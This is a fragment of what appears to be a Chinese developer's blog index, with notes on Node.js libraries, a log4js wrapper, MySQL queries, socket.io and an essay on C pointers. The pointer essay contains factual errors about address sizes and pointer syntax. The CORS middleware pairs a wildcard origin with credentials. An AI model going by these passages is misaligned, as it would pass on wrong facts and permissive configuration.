return [ readFileAsync('1.txt', 'utf-8'), readFileAsync('2.txt', 'utf-8'), readFileAsync('4.txt', 'utf-8') ];&#125;).spread(function (file1, file2, file3) &#123; console.log(file1); console.log(file2); console.log(file3);&#125;).catch(function (e) &#123; console.log(e);&#125;).finally(function () &#123; //抛错最后仍执行finally中的内容； console.log(4)&#125;)//Promise.join(Promise|Thenable|value promises..., Function handler) -&gt; Promise//将几个promise化的函数join起来，用法有点类似spread//examplevar join = Promise.join;join(readFileAsync('1.txt', 'utf-8'), readFileAsync('2.txt', 'utf-8'), readFileAsync('3.txt', 'utf-8'), function (file1, file2, file3) &#123; return parseInt(file1) + parseInt(file2) + parseInt(file3); &#125;).then(function (content) &#123; console.log("SUM结果:" + content); &#125;)//Synchronous inspection 同步检测//examplevar rf1 = readFileAsync('1.txt', 'utf-8');var rf2 = readFileAsync('2.txt', 'utf-8');var rf3 = readFileAsync('3.txt', 'utf-8');var join = Promise.join;join(rf1, rf2, rf3, function (file1, file2, file3) &#123; return parseInt(file1) + parseInt(file2) + parseInt(file3);&#125;).then(function (content) &#123; console.log("SUM结果:" + content);&#125;).finally(function () &#123; //.isFulfilled() -&gt; boolean //检测是否完成 console.log("success:" + rf1.isFulfilled()); //.isRejected() -&gt; boolean //检测是否失败 console.log("fail:" + rf1.isRejected()); //.isPending() -&gt; boolean //检测是否进行中 console.log("Pending:" + rf1.isRejected()); //.value() -&gt; dynamic //成功的结果,一般使用时先判定是否完成 if (rf1.isFulfilled()) &#123; console.log(rf1.value()); &#125; //.reason() -&gt; dynamic //失败原因，同样使用时先判定是否失败 if (rf1.isRejected()) &#123; console.log(rf1.reason()); &#125;&#125;)//.all() -&gt; Promise//参数为数组，并且里面的已promise化，全部成功返回的也为数组//examplevar rfAll1 = readFileAsync('1.txt', 'utf-8');var rfAll2 = readFileAsync('2.txt', 'utf-8');var rfAll3 = readFileAsync('3.txt', 'utf-8');var files = [rfAll1, rfAll2, rfAll3];Promise.all(files).then(function (s) &#123; console.log("all:" + s) &#125;);//.props() -&gt; Promise//类似于.all(),不过参数为object，全部成功返回值也为object//examplePromise.props(&#123; rfProp1: readFileAsync('1.txt', 'utf-8'), rfProp2: readFileAsync('2.txt', 'utf-8'), rfProp3: readFileAsync('3.txt', 'utf-8')&#125;).then(function(content)&#123; console.log(JSON.stringify(content));&#125;)//.settle() -&gt; Promise//基本等同于.all();//examplevar rfsettle1 = readFileAsync('1.txt', 'utf-8');var rfsettle2 = readFileAsync('2.txt', 'utf-8');var rfsettle3 = readFileAsync('3.txt', 'utf-8');var files = [rfsettle1, rfsettle2, rfsettle3];Promise.all(files).then(function (s) &#123; console.log("settle:" + s) &#125;);//.some(int count) -&gt; Promise//第一个参数为数组，第二个为个数,指的返回值最先返回成功的值//examplevar rfsome1 = readFileAsync('1.txt', 'utf-8');var rfsome2 = readFileAsync('2.txt', 'utf-8');var rfsome3 = readFileAsync('3.txt', 'utf-8');var files = [rfsome1, rfsome2, rfsome3];Promise.some(files,2).spread(function(first,second)&#123; console.log("some:" + first); console.log("some:" + second);&#125;)//.map(Function mapper [, Object options]) -&gt; Promise//参数为数组,不需要promise化，只要map里面的函数promise化就行。 有点类似于数组的map方法//examplevar files = ['1.txt','2.txt','3.txt'];Promise.map(files,function(file)&#123; return readFileAsync(file,'utf-8');&#125;).then(function(content)&#123; console.log("map:" + content) ;&#125;)//.reduce(Function reducer [, dynamic initialValue]) -&gt; Promise//概念有点像数组的reduce方法. total为返回的组装值，fileName为item,0为初始值//examplePromise.reduce(["1.txt", "2.txt", "3.txt"], function(total, fileName) &#123; return readFileAsync(fileName, "utf8").then(function(contents) &#123; return total + parseInt(contents, 10); &#125;);&#125;, 0).then(function(total) &#123; console.log("reduce:" + total)&#125;);]]></content>
      <categories>
        <category>NodeJs</category>
        <category>bluebird框架</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jsdom模块]]></title>
    <url>%2F2017%2F04%2F26%2Ffirst%2F</url>
    <content type="text"><![CDATA[jsdom模块应用12345678var jsdom = require("jsdom");jsdom.env( "https://iojs.org/dist", ["http://code.jquery.com/jquery.js"], function(errors,window)&#123; console.log("there have been",window.$("a").length-4,"io.js releases!"); &#125;); 或者:12345678var jsdom = require("jsdom"); jsdom.env(' &lt;p&gt;&lt;a class="the-link" href="https://github.com/tmpvar/jsdom"&gt;jsdom!&lt;/a&gt;&lt;/p&gt;', ["http://code.jquery.com/jquery.js"], function(errors,window)&#123; console.log("contents of a.the-link:",window.$("a.the-link").text()); &#125;); 第一个参数是抓取的url地址。第二个是你的jq代码。第三个就是回调方法。传给你的window就是一个包含url所连接的内容的全新window.可以在window.\$() 选择器下查找任何你想要的元素。]]></content>
      <categories>
        <category>NodeJs</category>
        <category>npm模块</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[log4js模块]]></title>
    <url>%2F2017%2F04%2F26%2Fthird%2F</url>
    <content type="text"><![CDATA[log4js模块应用安装1npm install log4js 配置说明 123456789101112131415&#123; "appenders": [ // 下面一行应该是用于跟express配合输出web请求url日志的 &#123;"type": "console", "category": "console"&#125;, // 定义一个日志记录器 &#123; "type": "dateFile", // 日志文件类型，可以使用日期作为文件名的占位符 "filename": "e:/weblogs/logs/", // 日志文件名，可以设置相对路径或绝对路径 "pattern": "debug/yyyyMMddhh.txt", // 占位符，紧跟在filename后面 "absolute": true, // filename是否绝对路径 "alwaysIncludePattern": true, // 文件名是否始终包含占位符 "category": "logInfo" // 记录器名 &#125; ], "levels":&#123; "logInfo": "DEBUG"&#125; // 设置记录器的默认显示级别，低于这个级别的日志，不会输出 &#125; pattern可以使用的占位符说明，不属于下列占位符格式，均会原样输出为文件名（注：不支持单个M、d、h、m）：yy 两位年份yyyy 四位年份MM 两位月份dd 两位日期hh 两位的小时数，按24小时制mm 两位的分数数ss 两位的秒数SSS 三位的毫秒数O 时区，大写字母O，占位符输出结果为+0800 输出日志代码 首先请把上面的配置代码保存为log4js.json文件，用于代码从文件加载配置（配置独立也便于修改和发布）：注意：json文件不支持任何形式的注释// 或 /**/，因此上面的配置代码里的注释要全部移除，不然会编译出错的123456var log4js = require('log4js'); // 注：配置里的日志目录要先创建，才能加载配置，不然会出异常 log4js.configure("./log4js.json"); var logInfo = log4js.getLogger('logInfo'); logInfo.info("测试日志信息"); 上述配置和代码，比较简单，重新封装log4js，定义了一个logHelper.js1、log4js.json配置文件内容（定义了4个日志记录器，分别写入到不同的日志目录；并自定义了2个属性，把一些公共属性提取到自定义属性中）：1234567891011121314151617&#123; "customBaseDir" :"e:/weblogs/logs/", "customDefaultAtt" :&#123; "type": "dateFile", "absolute": true, "alwaysIncludePattern": true &#125;, "appenders": [ &#123;"type": "console", "category": "console"&#125;, &#123;"pattern": "debug/yyyyMMddhh.txt", "category": "logDebug"&#125;, &#123;"pattern": "info/yyyyMMddhh.txt", "category": "logInfo"&#125;, &#123;"pattern": "warn/yyyyMMddhh.txt", "category": "logWarn"&#125;, &#123;"pattern": "err/yyyyMMddhh.txt", "category": "logErr"&#125; ], "replaceConsole": true, "levels":&#123; "logDebug": "DEBUG", "logInfo": "DEBUG", "logWarn": "DEBUG", "logErr": "DEBUG"&#125; &#125; 2、logHelper.js封装的文件内容123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111var helper = &#123;&#125;; exports.helper = helper; var log4js = require('log4js'); var fs = require("fs"); var path = require("path"); // 加载配置文件 var objConfig = JSON.parse(fs.readFileSync("log4js.json", "utf8")); // 检查配置文件所需的目录是否存在，不存在时创建 if(objConfig.appenders)&#123; var baseDir = objConfig["customBaseDir"]; var defaultAtt = objConfig["customDefaultAtt"]; for(var i= 0, j=objConfig.appenders.length; i&lt;j; i++)&#123; var item = objConfig.appenders[i]; if(item["type"] == "console") continue; if(defaultAtt != null)&#123; for(var att in defaultAtt)&#123; if(item[att] == null) item[att] = defaultAtt[att]; &#125; &#125; if(baseDir != null)&#123; if(item["filename"] == null) item["filename"] = baseDir; else item["filename"] = baseDir + item["filename"]; &#125; var fileName = item["filename"]; if(fileName == null) continue; var pattern = item["pattern"]; if(pattern != null)&#123; fileName += pattern; &#125; var category = item["category"]; if(!isAbsoluteDir(fileName))//path.isAbsolute(fileName)) throw new Error("配置节" + category + "的路径不是绝对路径:" + fileName); var dir = path.dirname(fileName); checkAndCreateDir(dir); &#125; &#125; // 目录创建完毕，才加载配置，不然会出异常 log4js.configure(objConfig); var logDebug = log4js.getLogger('logDebug'); var logInfo = log4js.getLogger('logInfo'); var logWarn = log4js.getLogger('logWarn'); var logErr = log4js.getLogger('logErr'); helper.writeDebug = function(msg)&#123; if(msg == null) msg = ""; logDebug.debug(msg); &#125;; helper.writeInfo = function(msg)&#123; if(msg == null) msg = ""; logInfo.info(msg); &#125;; helper.writeWarn = function(msg)&#123; if(msg == null) msg = ""; logWarn.warn(msg); &#125;; helper.writeErr = function(msg, exp)&#123; if(msg == null) msg = ""; if(exp != null) msg += "\r\n" + exp; logErr.error(msg); &#125;; // 配合express用的方法 exports.use = function(app) &#123; //页面请求日志, level用auto时,默认级别是WARN app.use(log4js.connectLogger(logInfo, &#123;level:'debug', format:':method :url'&#125;)); &#125; // 判断日志目录是否存在，不存在时创建日志目录 function checkAndCreateDir(dir)&#123; if(!fs.existsSync(dir))&#123; fs.mkdirSync(dir); &#125; &#125; // 指定的字符串是否绝对路径 function isAbsoluteDir(path)&#123; if(path == null) return false; var len = path.length; var isWindows = process.platform === 'win32'; if(isWindows)&#123; if(len &lt;= 1) return false; return path[1] == ":"; &#125;else&#123; if(len &lt;= 0) return false; return path[0] == "/"; &#125; &#125; 3、代码调用123var logger = require("./logHelper").helper; logger.writeInfo("哈哈1开始记录日志"); logger.writeErr("出错了，你怎么搞的"); 4、跟express集成，可以输出客户端GET 或 POST的url（如果没用，或者不需要记录url，这段代码忽略）：1234//在app.js中添加以下代码, 以便在日志中输出url请求，由于加载顺序的原因，放在其他app.use前面 var app = express(); var log = require('./logHelper'); log.use(app);]]></content>
      <categories>
        <category>NodeJs</category>
        <category>npm模块</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C语言的指针和变量]]></title>
    <url>%2F2017%2F04%2F24%2Ffirst%2F</url>
    <content type="text"><![CDATA[谈一谈指针今天一天基本都在看指针，变量，变量名，变量值，变量作用域等等。至于我怎么研究起指针来了，因为我想知道别人是怎么想的。我们都知道内存是计算机一部分，那么了解他，对于你了解其他的任何东西都有好处。要想了解指针我觉得最好是抛开书上的概念，老师对你们的说的只是概念，并不能让你们的自己去思考。其实指针也是数据，变量也是数据，你看到的都是数据。首先，我从内存编址说起，如果内存不编址，可想而知那是肯定找不到的。就像你去电影院，每个座位没有编号你能找到吗？很显然是不可能的。在对内存进行编址的时候，为了统一化，无论从硬件还是软件都以字节为单位。在造硬件的时候，造硬件的人都是以byte字节为最小单位，包括后来的4G内存，8G内存或者更高，没有哪个造硬件的自己造了一个4G+1bit的内存吧，我想是没有的，如果是这样就浪费了一个晶体管。那么在这个基础上，我们要根据内存的的大小来编址，那么在起初的32位系统中，人们采用的是4字节编址，这是为什么呢，因为四字节编址可以编出4294967295个地址，也就是4G，那么刚好满足了4G的内存，这也是为什么32位系统，只能安装4G的内存，因为它的编址方式与64位不同，64位编址采用8字节编址，那么64位可以编出多少个地址呢？大约应该是1个T吧，总之你也不可能安装1个T的内存条吧，估计都买不起。大家也可以看到仅仅多加了三十二个开关，编址的地址数量成指数级增长。好了，言归正传，当然我在这里举例子可能还会用十进制来表示，但是你要记住32系统的内存编址采用的是4字节。那么我们现在就开始模拟给内存编址吧。(提醒:关于栈，堆，我这里不做讨论。) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 当然内存里面的值我默认的是零。在说一遍，里面的编址1实质上应该是00000000000000000000000000000001.那么下面讲的所有我都会在此基础上进行阐述。还是从最牛的C语言开始吧！在C语言中，当我们定义int i=20;时到底完成了什么？首先需要分配内存，那么我们把int类型的i的值放入到内存地址1中， 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 也就是说i的内存在编译后分配的内存地址是1，那么今后所有用到i变量的内存地址都是1，这也是语言编译的厉害之处啊。(插一句，我想说我理解的编译，编译是什么，编译是我从内存中取到我定义的所有变量的地址和值，那么你用高级语言写的所有代码都将变成二进制，那么他们怎么读取呢，这很好办，先读取类型，如果是int取16位二进制，放进去这就是值，那么他的地址4字节也会随着标识着他，你会发现，只要你按照计算机执行的规律去编写，计算机就会给你规律的结果)，那么现在我在C语言再定义一个int *p;那么它是什么意思呢？如果不要int，其实我可以告诉你，它可以指向内存中的任何地址，但是加了int，也就是说它只能指向int数据类型的内存地址。那么你可以把20这个数据的内存地址赋值给p，一定要记住，在C语言中指针虽然也是数据，但是被写这个语言的人给限制了，它只能存储地址，不能存储数值。比如你要*p=20,那是不可能的,计算机不会拒绝你，但是C语言会拒绝你这样做。因为它到时候会用*p取数据，会把你当前存储的数值当做地址来操作数据。如何把20这个数据的内存地址赋值给p呢，C语言也提供了相应的操作符&amp;,很多人在&amp;和*之间感觉很模糊，那么我一会儿会让你很清楚。直接p=&b;这样就把b的内存地址赋值给了指针p。内存就变成了这样。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 内存地址2保存的是1，是b变量20的地址，那么你在操作*p的时候，他先去取地址，取的1地址，再去1地址找数据。这就是指针的作用。那么你们可能会想，这样的指针能有什么用，我直接用i取不就行了吗？其实这个问题，我还真想过，我们学java不必考虑内存地址，你定义了什么，它就指代什么，你不能改变它，也不能取得它的地址。我举个简单的例子吧！大家都知道当我们在全局变量中定义了a=3函数void add(int a),那么在调用add(a)时传入了实参a，但是在add函数内部调用a的时候，其实a的一个拷贝。也就是说你在函数中如何操作a都不会影响到全局的a，当然java有引用可以解决这个问题，引用也就相当于地址。但是就针对于我们刚才那个问题，C语言指针的解决当然比Java更快，更方便。所以这也是C/C++比Java快的原因吧。我直接通过内存地址进行编程，而你需要分配一块区域创建对象，再取引用对象里面的内容，当然会影响你的性能。那么我们取了内存的地址后，我们可以传递这个指针，在任何地方改变这个指针的指向的数据，都会改变源数据。至于**q那就更直观了。**q是指针的指针。也就是**q = p;那么**q应该是 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 1 2 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 那么当你输出*q的时候是p的地址，**q的时候是输出数据，q输出的是i的地址。 &amp;和*&amp;是取数据的地址，*是创建存储地址的变量。比如我们上面的**q,如果使用&amp;q那么取得是q存储的地址数据的地址，这里是把q当成了变量，比如再用&amp;(*q)取得是*q存储的地址数据的地址。不知道你们是否能理解。 推荐文章 结构体类型完全归纳 http://blog.chinaunix.net/uid-20672257-id-2955765.html C++网络编程(一)http://www.cnblogs.com/hlxs/archive/2011/09/09/2172351.html addrinfo结构体原型http://www.cnblogs.com/cxz2009/archive/2010/11/19/1881661.html WSAStartup函数的用途http://blog.csdn.net/stpeace/article/details/13279349 内存分配http://blog.csdn.net/youoran/article/details/10990815 C语言指针http://www.cnblogs.com/thrillerz/p/4642944.html 彻底搞定C语言指针http://blog.chinaunix.net/uid-22889411-id-59688.html]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[破万卷总结六]]></title>
    <url>%2F2017%2F04%2F21%2Ffirst%2F</url>
    <content type="text"><![CDATA[MySQL字符串操作字符串截取函数:left(),right(),substring(),substring_index(),mid(),substr() left(str,length) 123456&gt; select left('example.com',3);+----------------------+|left('example.com',3) |+----------------------+|exa |+----------------------+ right(str,length) 123456&gt; select right('example.com',3);+----------------------+|right('example.com',3)|+----------------------+|com |+----------------------+ substring(str,4)从第四个字符位置开始取，直到结束 1&gt; select substring]]></content>
      <categories>
        <category>破万卷APP</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[破万卷总结五]]></title>
    <url>%2F2017%2F04%2F18%2Ffirst%2F</url>
    <content type="text"><![CDATA[MySQL字符串转日期使用date_format 1&gt; select * from tairlist_day where date_format(rq,'%Y-%m-%d')&gt;'2010-08-01' and date_format(rq,'%Y-%m-%d')&lt;'2010-08-03' 使用str_to_date() 1select * from h_hotelcontext where now() between STR_TO_DATE(Start_time,'%Y-%m-%d %H:%i:%s') and STR_TO_DATE(End_time,'%Y-%m-%d %H:%i:%s'); 关于MySQL的countselect * from table group by id having count(t=’100’ or Null )&gt;1 and count(t=’103’ or null)&gt;2 关于MySQL的限制条数查询sqlserver是select top 1…MySQL是select from … limit n还有区间查法select from … limit 0,30查询前30条记录。 关于nodejs MySQL事务处理12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455var Dao=require('./Dao');var async = require('async');var pool=new Dao();module.exports = function transDao(sqlparamEntities,callback)&#123; pool.getConnection(function(err,connection)&#123; if(err)&#123; return callback(err,null); &#125; connection.beginTransaction(function(err)&#123; if(err)&#123; return callback(err,null); &#125; var funcAry = []; sqlparamEntities.forEach(function(sql_param)&#123; var temp = function(cb)&#123; var sql = sql_param.sql; var param = sql_param.param; connection.query(sql,param,function(err,rows,fields)&#123; if(err)&#123; connection.rollback(function()&#123; console.log(err); throw err; &#125;); &#125;else&#123; return cb(null,'ok'); &#125; &#125;); &#125;; funcAry.push(temp); &#125;); async.series(funcAry,function(err,result)&#123; console.log(err); if(err)&#123; connection.rollback(function(err)&#123; console.log(err); return callback(err,null); &#125;); &#125;else&#123; connection.commit(function(err,info)&#123; console.log(err); if(err)&#123; connection.rollback(function(err)&#123; console.log(err); connection.release(); &#125;); &#125;else&#123; connection.release(); return callback(null,info); &#125; &#125;) &#125; &#125;) &#125;); &#125;);&#125;;]]></content>
      <categories>
        <category>破万卷APP</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NodeJs研究]]></title>
    <url>%2F2017%2F04%2F17%2Fsecond%2F</url>
    <content type="text"><![CDATA[异步编程异步编程是指由于异步I/O等因素，无法同步获得执行结果时 async异步编程 series函数串行执行它的作用就是按照顺序一次执行12345678910async.series(&#123; one: function(callback)&#123; callback(null, 1); &#125;, two: function(callback)&#123; callback(null, 2); &#125;&#125;,function(err, results) &#123; console.log(results);&#125;); 输出:{one:1,two:2}series函数的第一个参数可以是一个数组也可以是一个JSON对象，参数类型不同，影响的是返回数据的格式。 waterfall函数waterfall和series函数有很多相似之处，都是按照顺序执行。不同之处是waterfall每个函数产生的值，都将传给下一个函数，而series则没有这个功能，示例如下：12345678910111213141516async.waterfall([ function(callback)&#123; callback(null, 'one', 'two'); &#125;, function(arg1, arg2, callback)&#123; // arg1 now equals 'one' and arg2 now equals 'two' callback(null, 'three'); &#125;, function(arg1, callback)&#123; // arg1 now equals 'three' callback(null, 'done'); &#125;], function (err, result) &#123; // result now equals 'done' console.log(result);&#125;); 另外需要注意的是 waterfall 的 tasks 参数只能是数组类型。当中途有函数出错，其err直接传给最终callback，结果被丢弃，后面的函数不再执行。 parallel(tasks, [callback]) parallel函数是并行执行多个函数，每个函数都是立即执行，不需要等待其它函数先执行。传给最终callback的数组中的数据按照tasks中声明的顺序，而不是执行完成的顺序，示例如下： 1234567891011async.parallel([ function(callback)&#123; callback(null, 'one'); &#125;, function(callback)&#123; callback(null, 'two'); &#125;],function(err, results)&#123;&#125;); tasks参数可以是一个数组或是json对象，和series函数一样，tasks参数类型不同，返回的results格式会不一样。 parallelLimit(tasks, limit, [callback]) parallelLimit函数和parallel类似，但是它多了一个参数limit。limit参数限制任务只能同时并发一定数量，而不是无限制并发，示例如下： 123456789101112async.parallelLimit([ function(callback)&#123; callback(null, 'one'); &#125;, function(callback)&#123; callback(null, 'two'); &#125;],2,function(err, results)&#123; console.log(results);&#125;); 关于nodejs调试第一种是node debug demo.js第二种是node –debug demo.js第一种我常用是调试无端口的程序，而第二种我往往是调试有端口监听的程序。第一个直接上手，第二个配合node-inspector模块来调试应用。第一种:12345678910&gt;node debug demo.js&gt;sb(5)&gt;sb(6)&gt;sb(7)//在第5，6,7行打上断点&gt;sb()//在当前行打上断点&gt;c //跳到下一个断点&gt;n //执行下一步&gt;s //进入函数&gt;o //跳出函数&gt;repl //进入repl状态，查看变量的值，按Ctrl+c退出 远程调试代码12&gt; node debug localhost:5858&gt; node --debug demo.js//打开文件 此时，nodejs 不会进入到命令行模式，而是直接执行代码，但是依然会开启内建调试功能，这就意味着我们具备了远程调试 NodeJS 代码的能力，使用 –debug 参数打开服务器的 nodejs 文件，然后通过：node debug &lt;服务器IP&gt;:&lt;调试端口，默认5858&gt;可以在本地远程调试 nodejs 代码。不过这里需要区分下 –debug 和 –debug-brk，前者会执行完所有的代码，一般是在监听事件的时候使用，而后者，不会执行代码，需要等到外部调试接入后，进入代码区。语言表述不会那么生动，读者可以自行测试下。node node –debug-brk=8787 proxy2.jsDebugger listening on port 8787 Buffer研究Buffer里面存的是16进制的数据。]]></content>
      <categories>
        <category>NodeJs</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[破万卷APP总结四]]></title>
    <url>%2F2017%2F04%2F16%2Ffirst%2F</url>
    <content type="text"><![CDATA[关于ionic报错错误类型：Application Error The connection to the server was unsucessful.(file:///android_asset/www/index.html)这个问题我研究了半天，最终被我自己折服了，原因是在index.html中请求了远程的文件，一旦请求不了，Android内置的浏览器不会像平常一样跳过，而是一直进行请求，但Android页面启动一旦过程就会报这个错误，所以一旦出现这个错误，如果你不是一个很大型的软件，可以试着检查一下你请求的任何文件，是否都在本地。 关于请求跨域和socket.io跨域这个问题同上个问题，我是一起解决的，导致遇到这类问题的主要原因是，没有看源码。要解决这个问题，我们必须知道同域和异域，必须知道请求头和请求体，跨域是如何造成的等等这些问题，在了解了实质以后，我们有很多方法可以解决，第一是客户端，第二是服务端，我解决采用的是服务端解决。解决方案:就是更改客户端的请求头，或者更改对客户端的要求。123456789101112app.use(function(req, res, next) &#123; res.setHeader('Access-Control-Allow-Origin', '*'); res.header('Access-Control-Allow-Credentials', true); res.header('Access-Control-Allow-Methods', 'POST, GET, PUT, DELETE, OPTIONS'); res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept"); if (req.method == 'OPTIONS') &#123; res.send(200); &#125; else &#123; next(); &#125; &#125;); 关于这里面的OPTIONS请求，这里我就不多说了，可以自己去了解。这是express的一个中间件。 socket.io跨域这个问题是因为没有看源码，不知道传递参数的拆解。服务端:1var io = require("socket.io").listen(server,&#123;origin:'*:*'&#125;); 客户端: 1var socket = io.connect('http://localhost:3000',&#123;rememberTransport:true,timeout:1500&#125;); ok，就是这样 socket提取session要实现socket可以提取session，首先我们要弄清session。session是基于cookie实现的，在客户端存有一个session的cookie key值，这个key在不变的情况下是connect.id。所以在提取这个key值时，必须使用cookieParser()。找session肯定要知道session的存储位置，所以肯定要有sessionStore，一般有mongodb,mysql,redis等等。有了这个我们就可以实现了。重要代码: 123456789var sessionScoket = require('session.socket.io');var sessionStore = new redisStore(&#123; port:cookiecfg.redis_port, host:cookiecfg.redis_host&#125;);var sessionScokets = new sessionScoket(io,sessionStore,cookieParser(cookiecfg.session_secret));sessionScokets.on('connection',instantCtrl.instantMessage); 可以发现最终的socket都是sessionSocket来实现了。 关于ng-repeat即时更新页面滚动\$scope.\$apply();var viewScroll = \$ionicScrollDelegate.\$getByHandle(‘messageDetailsScroll’);viewScroll.scrollBottom(); \$scope.messagedetail.messages[\$scope.messagedetail.messages.length]={‘isFromMe’:false,’message’:\$scope.send_content}; \$scope.\$watch(\$scope.sum, function(newVal, oldVal) { \$scope.iphone.fre = newVal &gt;= 100 ? 0 : 10; });parseInt(“1234blue”); //returns 1234parseInt(“0xA”); //returns 10parseInt(“22.5”); //returns 22parseInt(“blue”); //returns NaNparseInt(“AF”, 16); //returns 175parseInt(“10”, 2); //returns 2parseInt(“10”, 8); //returns 8parseInt(“10”, 10); //returns 10 stringObject.replace(regexp/substr,replacement) 关于socket操作服务端io.on(‘connection’,function(socket));//监听客户端连接,回调函数会传递本次连接的socket io.sockets.emit(‘String’,data);//给所有客户端广播消息 io.sockets.socket(socketid).emit(‘String’, data);//给指定的客户端发送消息 socket.on(‘String’,function(data));//监听客户端发送的信息 socket.emit(‘String’, data);//给该socket的客户端发送消息 广播消息 //给除了自己以外的客户端广播消息socket.broadcast.emit(“msg”,{data:”hello,everyone”});//给所有客户端广播消息io.sockets.emit(“msg”,{data:”hello,all”});分组 socket.on(‘group1’, function (data) { socket.join(‘group1’);});socket.on(‘group2’,function(data){ socket.join(‘group2’); });客户端发送 socket.emit(‘group1’)，就可以加入group1分组；socket.emit(‘group2’)，就可以加入group2分组； 一个客户端可以存在多个分组（订阅模式） 踢出分组 socket.leave(data.room); 对分组中的用户发送信息 //不包括自己socket.broadcast.to(‘group1’).emit(‘event_name’, data);//包括自己io.sockets.in(‘group1’).emit(‘event_name’, data);broadcast方法允许当前socket client不在该分组内 获取连接的客户端socket io.sockets.clients().forEach(function (socket) { //…..})获取分组信息 //获取所有房间（分组）信息io.sockets.manager.rooms//来获取此socketid进入的房间信息io.sockets.manager.roomClients[socket.id]//获取particular room中的客户端，返回所有在此房间的socket实例io.sockets.clients(‘particular room’)另一种分组方式 io.of(‘/some’).on(‘connection’, function (socket) { socket.on(‘test’, function (data) { socket.broadcast.emit(‘event_name’,{}); });});客户端 var socket = io.connect(‘ws://103.31.201.154:5555/some’)socket.on(‘even_name’,function(data){ console.log(data);})客户端都链接到ws://103.31.201.154:5555 但是服务端可以通过io.of(‘/some’)将其过滤出来。 另外，Socket.IO提供了4个配置的API：io.configure, io.set, io.enable, io.disable。其中io.set对单项进行设置，io.enable和io.disable用于单项设置布尔型的配置。io.configure可以让你对不同的生产环境（如devlopment，test等等）配置不同的参数。 客户端操作建立一个socket连接 var socket = io(“ws://103.31.201.154:5555”); 监听服务消息 socket.on(‘msg’,function(data){ socket.emit(‘msg’, {rp:”fine,thank you”}); //向服务器发送消息 console.log(data);});socket.on(“String”,function(data)) 监听服务端发送的消息 Sting参数与服务端emit第一个参数相同 监听socket断开与重连。 socket.on(‘disconnect’, function() { console.log(“与服务其断开”);}); socket.on(‘reconnect’, function() { console.log(“重新连接到服务器”);});客户端socket.on()监听的事件：connect：连接成功connecting：正在连接disconnect：断开连接connect_failed：连接失败error：错误发生，并且无法被其他事件类型所处理message：同服务器端message事件anything：同服务器端anything事件reconnect_failed：重连失败reconnect：成功重连reconnecting：正在重连当第一次连接时，事件触发顺序为：connecting-&gt;connect；当失去连接时，事件触发顺序为：disconnect-&gt;reconnecting（可能进行多次）-&gt;connecting-&gt;reconnect-&gt;connect。 关于nodejs传输层socket基于net模块服务端: 123456789101112var net = require('net');var server = net.createServer(function(c) &#123; //'connection' listener console.log('server connected'); c.on('end', function() &#123; console.log('server disconnected'); &#125;); c.write('hello\r\n'); c.pipe(c); &#125;); server.listen(端口号, function() &#123; //'listening' listener console.log('server bound'); &#125;); 客户端: 123456789101112var net = require('net'); var client = new net.Socket(); //前面这2句就不用介绍了client.connect(6000, "127.0.0.1"); //端口号 + 服务器的IPclient.on('data', function (data) &#123; //接受返回的数据,回调 console.log('!!!!!!!!:' + data);&#125;);client.on('error', function (exception) &#123; //错误回调 console.log('socket error:' + exception);// client.end();&#125;); 具体看这篇博客:http://blog.csdn.net/zhangxin09/article/details/12844975 TCO服务端:123456789101112131415161718192021222324252627282930var net = require('net');var HOST = '127.0.0.1';var PORT = 6969;// 创建一个TCP服务器实例，调用listen函数开始监听指定端口// 传入net.createServer()的回调函数将作为”connection“事件的处理函数// 在每一个“connection”事件中，该回调函数接收到的socket对象是唯一的net.createServer(function(sock) &#123; // 我们获得一个连接 - 该连接自动关联一个socket对象 console.log('CONNECTED: ' + sock.remoteAddress + ':' + sock.remotePort); // 为这个socket实例添加一个"data"事件处理函数 sock.on('data', function(data) &#123; console.log('DATA ' + sock.remoteAddress + ': ' + data); // 回发该数据，客户端将收到来自服务端的数据 sock.write('You said "' + data + '"'); &#125;); // 为这个socket实例添加一个"close"事件处理函数 sock.on('close', function(data) &#123; console.log('CLOSED: ' + sock.remoteAddress + ' ' + sock.remotePort); &#125;);&#125;).listen(PORT, HOST);console.log('Server listening on ' + HOST +':'+ PORT); TCO客户端12345678910111213141516171819202122232425262728var net = require('net');var HOST = '127.0.0.1';var PORT = 6969;var client = new net.Socket();client.connect(PORT, HOST, function() &#123; console.log('CONNECTED TO: ' + HOST + ':' + PORT); // 建立连接后立即向服务器发送数据，服务器将收到这些数据 client.write('I am Chuck Norris!');&#125;);// 为客户端添加“data”事件处理函数// data是服务器发回的数据client.on('data', function(data) &#123; console.log('DATA: ' + data); // 完全关闭连接 client.destroy();&#125;);// 为客户端添加“close”事件处理函数client.on('close', function() &#123; console.log('Connection closed');&#125;); ionic常见问题网站http://ionichina.com/topic/54f051698cbbaa7a56a49f98http://www.ionic.ren/http://blog.csdn.net/qq_30100043/article/details/54344881ionic设置启动页 http://www.cnblogs.com/Eplayed/p/5567502.html]]></content>
      <categories>
        <category>破万卷APP</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
